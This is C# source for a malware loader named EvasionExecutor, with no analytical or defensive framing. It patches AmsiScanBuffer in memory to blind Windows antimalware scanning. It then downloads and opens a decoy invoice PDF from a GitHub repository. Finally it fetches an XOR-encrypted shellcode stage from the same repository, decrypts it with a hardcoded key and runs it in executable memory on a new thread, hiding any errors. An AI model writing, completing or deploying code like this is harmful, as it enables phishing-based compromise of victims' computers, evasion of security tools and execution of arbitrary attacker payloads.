using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

public class EvasionExecutor
{
  // --- Win32 API Functions ---
  [DllImport("kernel32.dll")] private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32.dll")] private static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32.dll")] private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
  
  // MODIFIED: Capture the thread handle returned by CreateThread
  [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
  
  // NEW: Add WaitForSingleObject to wait for the thread to finish
  [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

  private static byte[] xorKey = new byte[] { 0x69, 0x30, 0x78, 0x75, 0x46, 0x6e, 0x5a, 0x4f, 0x66, 0x36, 0x39, 0x58, 0x37, 0x62, 0x6b, 0x74, 0x66, 0x33, 0x56, 0x73 };

  public void Trigger() 
  {
    PatchMem();
    try
    {
      using (WebClient pdfClient = new WebClient())
      {
        string tempPdfPath = Path.GetTempPath() + Path.GetRandomFileName() + ".pdf";
        pdfClient.DownloadFile("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice%20for%20Load%20ID%2080814532.pdf", tempPdfPath);
        Process.Start(tempPdfPath);
      }

      using (WebClient payloadClient = new WebClient())
      {
        payloadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
        byte[] encryptedShellcode = payloadClient.DownloadData("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor");
        
        byte[] shellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
          shellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);

        // --- THE FIX IS HERE ---
        uint threadId;
        // 1. Create the thread and get its handle.
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out threadId);
        
        // 2. Wait for that thread handle to finish. 0xFFFFFFFF means wait indefinitely.
        WaitForSingleObject(hThread, 0xFFFFFFFF);
      }
    }
    catch {} 
  }

  private void PatchMem()
  {
    try
    {
      string lib = "am" + "si" + ".dll";
      string func = "Amsi" + "Scan" + "Buffer";
      IntPtr libHandle = LoadLibrary(lib);
      IntPtr funcAddress = GetProcAddress(libHandle, func);
      byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
      uint oldProtect;
      VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);
      Marshal.Copy(patch, 0, funcAddress, patch.Length);
      VirtualProtect(funcAddress, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
    catch {}
  }
}
